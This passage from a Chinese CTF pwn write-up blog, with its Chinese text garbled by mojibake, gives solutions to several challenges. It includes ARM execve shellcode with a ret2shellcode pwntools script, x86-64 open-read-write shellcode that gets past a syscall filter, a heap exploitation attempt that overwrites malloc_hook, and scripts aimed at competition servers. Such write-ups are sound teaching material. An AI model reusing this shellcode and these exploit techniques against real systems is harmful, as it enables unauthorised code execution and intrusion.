class="hljs-string">&quot;Y&quot;</span>)<br>sl(<span class="hljs-string">&#x27;666&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;EASYBUF&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="easyarm">easyarm</h2><p>32ä½armä¸‹çš„ret2shellcode</p><p>è¦çŸ­ä¸€ç‚¹çš„shellcodeï¼Œè¦æ±‚å°äº0x32å­—èŠ‚,è¿™ä¸ª0x22å­—èŠ‚</p><blockquote><p>\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&quot;./easyarm&quot;</span><br>r=process([<span class="hljs-string">&quot;qemu-arm&quot;</span>,<span class="hljs-string">&quot;./easyarm&quot;</span>])<br><span class="hljs-comment">#r=remote(&quot;10.10.30.13&quot;, 30008)</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>shellcode=<span class="hljs-string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>buf=<span class="hljs-number">0x99D44</span><br>sea(<span class="hljs-string">&quot;&gt; Try typing something first :\n&quot;</span>,shellcode)<br>sla(<span class="hljs-string">&quot;&gt; Get the FLAG by typing a little :\n&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x38</span>+p32(buf))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="sandbox">sandbox</h2><blockquote><p>ä»£ç æœ‰äº›è®¸å¤æ‚ï¼Œä½†ä¹Ÿä¸ç”¨ç»†ç©¶ï¼Œgoogleä¸€ä¸‹æŸäº›ç‰¹å¾è¯­å¥ï¼Œå’Œlibcapstone.so.5è¿™äº›åº“å¯ä»¥å¤§è‡´ç¡®å®šæ–¹å‘ï¼Œç¨å¾®çœ‹ä¸€ä¸‹ä¼ªä»£ç ,ç»“åˆç¨‹åºè¿è¡Œå¯ä»¥å‘ç°ï¼š</p></blockquote><p>å®ƒå®ç°äº†ä¸€ä¸ªåæ±‡ç¼–å™¨ï¼Œä¼šæŠŠæˆ‘ä»¬çš„ä»£ç ç¿»è¯‘æˆæ±‡ç¼–è¯­è¨€å±•ç¤ºå‡ºæ¥ï¼Œå¹¶æ‰§è¡Œ</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/1.png" alt="1"></p><p>syscall 59ä¹Ÿå°±æ˜¯ç³»ç»Ÿè°ƒç”¨systemçš„è¯ä¼šè¢«æ£€æµ‹</p><p>è¿™é‡Œa2[20]å¯¹åº”çš„åº”è¯¥æ˜¯rax</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/2.png" alt="2"></p><p>é‚£æˆ‘ä»¬å°±ç”¨orwè¯»flag</p><p>é¢˜ç›®ç™½ç»™äº†å‡½æ•°å®é™…åœ°å€ï¼Œç›¸å½“äºbssä¹ŸçŸ¥é“äº†ï¼Œä½†ä¸ç”¨ä¹Ÿè¡Œ</p><p><a href="https://tttang.com/archive/1447/#toc_shellcode_3">è¿™ä¹ˆå»orw</a></p><blockquote><p>sc = shellcraft.amd64.open(â€œ./flagâ€)<br>sc += shellcraft.amd64.read(â€œraxâ€, â€œrspâ€, 0x100)<br>sc += shellcraft.amd64.write(1, â€œrspâ€, 0x100)</p></blockquote><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/3.png" alt="3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./sandbox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>ru(<span class="hljs-string">&quot;A gift for you : 0x&quot;</span>)<br>bss=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x1572</span>+<span class="hljs-number">0x6000</span><br>info(<span class="hljs-string">&quot;bss&quot;</span>,bss)<br>sla(<span class="hljs-string">&quot;How long do you need to enter ?\n&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>sc =asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x101010101010101</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x101010101010101 ^ 0x67616c662f2e</span><br><span class="hljs-string">    xor [rsp], rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call open() */</span><br><span class="hljs-string">    push SYS_open /* 2 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor eax, eax /* SYS_read */</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    push 1</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    xor edx, edx</span><br><span class="hljs-string">    mov dh, 0x100 &gt;&gt; 8</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    /* call write() */</span><br><span class="hljs-string">    push SYS_write /* 1 */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment">#sc = shellcraft.amd64.open(&quot;./flag&quot;)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.read(&quot;rax&quot;, &quot;rsp&quot;, 0x100)</span><br><span class="hljs-comment">#sc += shellcraft.amd64.write(1, &quot;rsp&quot;, 0x100)</span><br><br>info(<span class="hljs-string">&quot;lenth&quot;</span>,<span class="hljs-built_in">len</span>(sc))<br><span class="hljs-built_in">print</span>(sc)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;Your input : &quot;</span>,sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="no-output-ä¸ä¼š">no_output(ä¸ä¼š)</h2><p>libc2.31ä¿æŠ¤å…¨å¼€,ç”¨çš„æ˜¯callocåˆ†é…,sizeé™åˆ¶[0,0x180]ï¼Œæ²¡æœ‰showï¼Œå­˜åœ¨uaf</p><p>æˆ‘çš„æƒ³æ³•å°±æ˜¯ç”¨fastbin doublefreeï¼Œæ„é€ å †é‡å ï¼Œä¼ªé€ ä¸ªunsortbinï¼Œåˆ‡å‰²unsortbinä½¿main_arena+96åœ°å€åˆ°å’Œè¿™ä¸ªunsortbiné‡å çš„fastbinçš„fdä¸Šï¼Œç„¶åPartial overwriteæ”¹ä¸ºmalloc_hookçš„åœ°å€ï¼Œåˆ†é…fastbinåˆ°malloc_hookï¼Œæ”¹ä¸ºone_gadgetï¼Œæœ‰å‡ ä¸ªä½è¦çˆ†ç ´ä¸€ä¸‹</p><p>æˆ‘å·²ç»èµ°åˆ°æœ€åä¸€æ­¥äº†,ä¹ŸæˆåŠŸæ”¹å†™ä¸ºogäº†ï¼Œå°±æœ€åè§¦å‘æŠ¥é”™äº†</p><p><img src="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/4.png" alt="4"></p><p>æœ¬é¢˜libcæ˜¯2.31,æŸ¥é˜…èµ„æ–™å’Œå¯¹æ¯”æºç åå‘ç°ï¼Œæ—©åœ¨2.29å°±å·²ç»å¯¹unsortbinè¿›è¡Œäº†åŒå‘é“¾è¡¨çš„ç»†è‡´æ£€æŸ¥</p><p>è€Œæˆ‘å‰é¢çš„æ“ä½œå·²ç»ç ´åäº†å®ƒçš„é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>             || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>             || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>         <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>           malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´è¿™ç§æ–¹æ³•å·²ç»èµ°ä¸é€šäº†,è¦ä¹ˆæ‰“IOï¼Œç”¨ä»€ä¹ˆæ–¹æ³•æ</p><p><strong>å¤±è´¥exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;10.10.30.13&#x27;</span>,<span class="hljs-number">30006</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>ru(<span class="hljs-string">&quot;gift :\n&quot;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x2a0</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#-----fill tcache--------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#-----overlap-------</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x350</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x21</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x71</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<span class="hljs-comment">#now 5&amp;4 overlap</span><br><span class="hljs-comment">#-----unsortbin----</span><br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">6</span>)<br>    edit(<span class="hljs-number">6</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">5</span>)<br><span class="hljs-comment">#--------------------</span><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>edit(<span class="hljs-number">2</span>,p8(<span class="hljs-number">0x3d</span>))<span class="hljs-comment">#0x7fc218ed9be0-96-0x10-0x33</span><br><span class="hljs-comment">#edit(5,p64(0x20)+p64(0)*2+p64(0x51))</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">b&quot;\x2e\x0b\xe8&quot;</span>)<br>og=[<span class="hljs-number">0xe3b2e</span>,<span class="hljs-number">0xe3b31</span>,<span class="hljs-number">0xe3b34</span>]<br>info(<span class="hljs-string">&quot;__malloc_hook&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>sla(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x70</span>))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ•°ç»„è¶Šç•Œ</tag>
      
      <tag>arm</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022pwnhubå†¬å­£èµ›pwn</title>
    <link href="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <url>/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><h2 id="justJS">justJS</h2><p>v8 pwnï¼Œç”¨åˆ«äººéé¢„æœŸçš„æ–¹æ³•</p><p>ä¿ºå•¥ä¹Ÿä¸ä¼šå•¥ä¹Ÿä¸æ‡‚</p><p>è¾“eval(read(â€˜flagâ€™))æ¢è¡Œå†æ¢è¡Œèƒ½è¯»å‡ºflag</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/2.png" alt="2"></p><h2 id="æ¢é™©è€…">æ¢é™©è€…</h2><p>æ•´æ•°æº¢å‡ºï¼Œè´­ä¹°é˜²å¾¡ï¼Œæ‰“999çº§æ€ª,æŠ—20è½®è·å¾—shell</p><p>150*28633116=0x100000068æº¢å‡ºå˜ä¸º0x68</p><p><img src="/2022/12/23/2022pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B/1.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;47.97.127.1&#x27;</span>,<span class="hljs-number">27768</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br><span class="hljs-comment">#---------------------------3</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&quot;HP: &quot;</span>)<br>    num=rc(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;15 &quot;</span>:<br>        sl(<span class="hljs-string">&quot;1&quot;</span>)<br>        ru(<span class="hljs-string">&quot;GOLD:  &quot;</span>)<br>        num=rc(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-string">&quot;200&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        sl(<span 